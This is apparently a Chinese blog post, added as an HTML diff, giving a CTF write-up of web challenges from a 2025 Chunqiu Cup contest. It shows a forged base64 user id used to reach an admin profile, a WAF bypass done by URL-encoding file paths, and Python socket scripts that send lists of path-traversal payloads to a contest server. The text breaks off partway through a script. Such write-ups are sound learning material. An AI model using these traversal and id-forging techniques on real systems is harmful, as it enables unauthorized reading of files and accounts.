@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;AzAdw3X4KicUuxkWgpjcRkhAnbd 队伍名: legend 总计正确: web 方向 15 道题 每天都花了好几个小时，web 中能完全自己做的题都独立做了，大概有 30% 到 40%； 不会做的题有的借助 AI，也对了那么多。 感觉题很贴近实际，很多都是从实际的系统出发的。 这三天真的让我学到了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[补档]2025春秋杯冬季赛·赛题WP">
+<meta property="og:url" content="http://hnu-legend1440.com/2026/02/02/%E8%A1%A5%E6%A1%A3-2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%C2%B7%E8%B5%9B%E9%A2%98WP/index.html">
+<meta property="og:site_name" content="拂云观 · legend1440">
+<meta property="og:description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;AzAdw3X4KicUuxkWgpjcRkhAnbd 队伍名: legend 总计正确: web 方向 15 道题 每天都花了好几个小时，web 中能完全自己做的题都独立做了，大概有 30% 到 40%； 不会做的题有的借助 AI，也对了那么多。 感觉题很贴近实际，很多都是从实际的系统出发的。 这三天真的让我学到了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hnu-legend1440.com/images/N41gbiWuZozYQexmt8CcH91Indf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/EP6CbmRgHomptqxkwX4cXkpUnJg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/CuUzbKDmnoirW8xe38PccqOhn7d.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XCA3baIpPoIE8Lx4vkKcDiiRnce.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SNYQb9grsoDpMlx3rOZcGD4CnQe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/M99Zbf9TCohmJsxIB0kcFQ7Cnsb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DqcxbPmTgoGK2xxNy9ScRsY6ny3.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LZyxbmFacopyWLxOY5HcMVh6nmd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/IpdXbvZMto5Gyfx9EA3cLJMPnUZ.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/EfhjbKNrDoCzpDxCNmmcyqKined.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KGLkb58xfojm6nxnfQzcttZ9nSc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PBxAbKWBLowqM2xfLfdcLUCNnah.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/S8SVbUqbJoLs52xNmKIcbtxInid.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/I7fzb3EMBoZwzaxnNzzcbzxgnzc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PkeGbi5JnopkWGxSOpLce0Xlnjf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DzAvbZrrdoXuj2xROsUcS9kanCe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/INTnbTGM5oy8yixK2HAcCbUInOb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WYubb3anLoKutexenClcQZwnnYb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/M1HWb0AoWo6375xNcnAcukw8nWh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XgQpbw2wuoEGZ1xoQwVcFhzYnvc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/VWO1bGbEyoDyOXx6HZtcgowTnSe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NTU6bFhGOoBVdrx0TE3cVQQ5n8c.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Uz3BbDamEoHuYPx1RH0cjVs1nbc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SUZrbiIhioFw93xoIf5crfY0nbg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/IiGlbggloofwcXxzpC3c7LFznBd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JL9Kb2YP1oq3kaxmjlDcVgcPnvb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Un2EbgWCToNtM7xrMl3cYrYVn4b.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/MQxhbUQ6Sofz4mxASH4cUeylnOm.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/N6EzbNDzXoIN8KxfuQRcUdvWnEe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JEjhbT5hToIdf5xy0m7cLxujn6c.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LsJbbrLMfodslzxLsfwc2YOonmf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Zhclbz3sVoagnDxbHxuc2kz1nBe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ChaqbwvLNonEPLxluAlcL8DYnZc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/CVSmb1LzWo1pirxBHSYcphICnsg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XcT5bwyZPoSXzBxZhNIcf32cnSd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WQFNb9wpWoUGQBxqMB2cnLJEniq.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/RgFnbKoZOoAekQxaBmjcQkFJnCb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WrUybh0GhoMRlbxTmSqccl78nFc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/I4atbGgxDoEhi4xs1pGc9IvLnPf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GtVHbEAVCor2CDxfX6PcuQUEnme.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/IATVbAogUomXVdxlivictLBinlg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/BioibIJTPoDcVcxNGBmcflsinLc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GDj9bL77Sos3uMxx4fbcENeonwb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ZOY5bAcy7oDIB3xJN9tc4oNsnef.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/VyuTbUL5VoTvFLxZxypchlxankf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OjMYbrM0EoPTSLxhLcBc63VHnZe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SIlEbyPLLoUyvCxATz9ca69bnjb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ULfXbMubtojvBpxiYd9cCBHQnyd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Nu0vbYencoEiWExvlgKc0V2Onzf.png">
+<meta property="article:published_time" content="2026-02-02T07:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-08T07:12:52.303Z">
+<meta property="article:author" content="legend1440">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hnu-legend1440.com/images/N41gbiWuZozYQexmt8CcH91Indf.png">
+
+<link rel="canonical" href="http://hnu-legend1440.com/2026/02/02/%E8%A1%A5%E6%A1%A3-2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%C2%B7%E8%B5%9B%E9%A2%98WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>[补档]2025春秋杯冬季赛·赛题WP | 拂云观 · legend1440</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start --><link rel="stylesheet" href="/Blog-Like/style.css">
+<script src="/Blog-Like/Blog-Like.js"></script><!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">拂云观 · legend1440</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>
+
+  </li>
+        <li class="menu-item menu-item-training">
+
+    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>
+
+  </li>
+        <li class="menu-item menu-item-wp">
+
+    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>
+
+  </li>
+        <li class="menu-item menu-item-puzzles">
+
+    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>
+
+  </li>
+        <li class="menu-item menu-item-server">
+
+    <a href="/categories/server/" rel="section"><i class="fa fa-star fa-fw"></i>服务器风采</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/02/02/%E8%A1%A5%E6%A1%A3-2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%C2%B7%E8%B5%9B%E9%A2%98WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="legend1440">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="拂云观 · legend1440">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [补档]2025春秋杯冬季赛·赛题WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-02-02 15:00:00" itemprop="dateCreated datePublished" datetime="2026-02-02T15:00:00+08:00">2026-02-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-02-08 15:12:52" itemprop="dateModified" datetime="2026-02-08T15:12:52+08:00">2026-02-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index"><span itemprop="name">-WP</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/AzAdw3X4KicUuxkWgpjcRkhAnbd">https://icnewi51k2yp.feishu.cn/wiki/AzAdw3X4KicUuxkWgpjcRkhAnbd</a></p>
+<p>队伍名: legend</p>
+<p>总计正确: web 方向 15 道题</p>
+<p>每天都花了好几个小时，web 中能完全自己做的题都独立做了，大概有 30% 到 40%；</p>
+<p>不会做的题有的借助 AI，也对了那么多。</p>
+<p>感觉题很贴近实际，很多都是从实际的系统出发的。</p>
+<p>这三天真的让我学到了非常多的东西，包括之前跳过的 git 泄露，许多获取信息的方式，curl 发请求的方法等等</p>
+<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="问题-1-信息收集-My-Hidden-Profile"><a href="#问题-1-信息收集-My-Hidden-Profile" class="headerlink" title="[问题 1&#x2F;信息收集] My_Hidden_Profile"></a>[问题 1&#x2F;信息收集] My_Hidden_Profile</h2><p>进入用户 1 空间后，注意到 uid 为 base64 编码</p>
+<p><img src="/images/N41gbiWuZozYQexmt8CcH91Indf.png"></p>
+<p>解码发现是时间戳:id 的格式</p>
+<p><img src="/images/EP6CbmRgHomptqxkwX4cXkpUnJg.png"></p>
+<p>加上主页面的提示，管理员 id 为 999</p>
+<p><img src="/images/CuUzbKDmnoirW8xe38PccqOhn7d.png"></p>
+<p>于是构造 user1 的时间戳:999 的 base64 编码</p>
+<p><img src="/images/XCA3baIpPoIE8Lx4vkKcDiiRnce.png"></p>
+<p>get 提交 uid 即得 flag</p>
+<p><img src="/images/SNYQb9grsoDpMlx3rOZcGD4CnQe.png"></p>
+<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>这里的时间戳检测应该不存在或者只要检测小于等于 user1 的值就行了，反正我改了个 id 就过了</p>
+<p>get 方式查 uid 是有点没想到，但蒙出来了</p>
+<h2 id="问题-2-抓包改名-HyperNode"><a href="#问题-2-抓包改名-HyperNode" class="headerlink" title="[问题 2&#x2F;抓包改名] HyperNode"></a>[问题 2&#x2F;抓包改名] HyperNode</h2><p>拿到题目，是一个读取文件的题</p>
+<p><img src="/images/M99Zbf9TCohmJsxIB0kcFQ7Cnsb.png"></p>
+<p>点击执行读取并抓包，id 会显示文件名，我们可以改成根目录下的旗帜</p>
+<p>我们一开始访问绝对路径，显示被阻拦，后来访问相对路径</p>
+<p><img src="/images/DqcxbPmTgoGK2xxNy9ScRsY6ny3.png"></p>
+<p>仍被阻拦</p>
+<p><img src="/images/LZyxbmFacopyWLxOY5HcMVh6nmd.png"></p>
+<p>但在 Burp 中右键将路径 url 编码，访问成功，即得 flag</p>
+<p><img src="/images/IpdXbvZMto5Gyfx9EA3cLJMPnUZ.png"></p>
+<p><img src="/images/EfhjbKNrDoCzpDxCNmmcyqKined.png"></p>
+<h3 id="做题启示-1"><a href="#做题启示-1" class="headerlink" title="做题启示"></a>做题启示</h3><p>在 URL 传到服务器之前，会进行一次且只有一次 URL 解码，URL 解码的规则非常固定：<strong>只识别并解析 <strong><strong>%+ 两位十六进制数</strong></strong> 这种格式的字符（比如 %2e、%2f、%75），其他所有字符（明文）都直接跳过，原样保留</strong>。</p>
+<p>检测分为网关(WAF)层检测和应用层检测，本题的检测属于网关层的检测，在 URL 解码之前检测</p>
+<h2 id="问题-3-nc-遍历路由-Static-Secret"><a href="#问题-3-nc-遍历路由-Static-Secret" class="headerlink" title="[问题 3&#x2F;nc 遍历路由] Static_Secret"></a>[问题 3&#x2F;nc 遍历路由] Static_Secret</h2><p>容器一开始直接提供了个 nc 连接</p>
+<p><img src="/images/KGLkb58xfojm6nxnfQzcttZ9nSc.png"></p>
+<p>我们写一个脚本来访问常用地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;39.106.48.123&quot;</span></span><br><span class="line">port = <span class="number">23011</span></span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/../../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/../../../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/..%2fflag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/%2e%2e/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/%252e%252e/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/./flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/flag/../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/?file=flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/index.html/../../flag&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> payloads:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    req = <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s.send(req.encode())</span><br><span class="line">    resp = s.recv(<span class="number">4096</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp <span class="keyword">and</span> <span class="string">&quot;400&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp[:<span class="number">500</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发现 file&#x3D;flag 回显成功</p>
+<p><img src="/images/PBxAbKWBLowqM2xfLfdcLUCNnah.png"></p>
+<p>于是再次构造遍历脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">23011</span>))</span><br><span class="line">s.send(<span class="string">b&quot;GET /?file=flag HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">4096</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;39.106.48.123&quot;</span></span><br><span class="line">port = <span class="number">23011</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">path</span>):</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    req = <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s.send(req.encode())</span><br><span class="line">    resp = s.recv(<span class="number">4096</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先看 /static/index.html</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing /static/index.html&quot;</span>)</span><br><span class="line">resp = send_request(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp[:<span class="number">300</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 尝试目录遍历</span></span><br><span class="line">paths = [</span><br><span class="line">    <span class="string">&quot;/static/../../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/../../../flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/..%2f..%2fflag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/%2e%2e/%2e%2e/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/lnk_flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/link&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/static/flag.so&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> paths:</span><br><span class="line">    resp = send_request(p)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp <span class="keyword">and</span> <span class="string">&quot;400&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Possible success: <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp[:<span class="number">500</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed: <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 检查 /static/ 目录列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nTesting /static/&quot;</span>)</span><br><span class="line">resp = send_request(<span class="string">&quot;/static/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp[:<span class="number">500</span>])</span><br></pre></td></tr></table></figure>
+
+<p>找到成功的路径</p>
+<p><img src="/images/S8SVbUqbJoLs52xNmKIcbtxInid.png"></p>
+<p>访问其回显的数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;39.106.48.123&quot;</span></span><br><span class="line">port = <span class="number">23011</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((host, port))</span><br><span class="line">req = <span class="string">b&quot;GET /static/../../flag HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">s.send(req)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收数据直到收完</span></span><br><span class="line">data = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += chunk</span><br><span class="line">    <span class="comment"># 根据 Content-Length 判断收完</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Content-Length: 44&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 找到空行分隔 header 和 body</span></span><br><span class="line">        parts = data.split(<span class="string">b&quot;\r\n\r\n&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">2</span>:</span><br><span class="line">            body = parts[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(body) &gt;= <span class="number">44</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印 body 的原始字节和字符串</span></span><br><span class="line">parts = data.split(<span 